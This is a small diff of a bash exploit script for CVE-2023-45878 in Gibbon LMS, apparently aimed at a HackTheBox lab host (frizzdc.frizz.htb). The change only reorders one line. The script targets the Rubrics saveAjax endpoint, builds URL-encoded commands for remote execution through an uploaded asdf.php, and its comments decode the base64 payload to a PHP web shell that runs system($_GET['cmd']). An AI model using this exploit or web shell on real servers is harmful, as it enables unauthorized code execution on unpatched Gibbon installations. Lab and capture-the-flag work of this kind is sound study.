@@ -2,10 +2,10 @@
 # CVE-2023-45878
 
 BASE_URL='http://frizzdc.frizz.htb/Gibbon-LMS'
+VULNERABLE_URL="${BASE_URL}/modules/Rubrics/rubrics_visualise_saveAjax.php"
 COMMAND="${@:1}"
 URL_ENCODED_COMMAND=$(echo -n "$COMMAND" | jq -SRr @uri)
 RCE="${BASE_URL}/asdf.php"
-VULNERABLE_URL="${BASE_URL}/modules/Rubrics/rubrics_visualise_saveAjax.php"
 # PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKT8%2b = URL encoded base64 data
 # URL-decoded: PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKT8+
 # Base64-decoded: <?php echo system($_GET['cmd'])?>
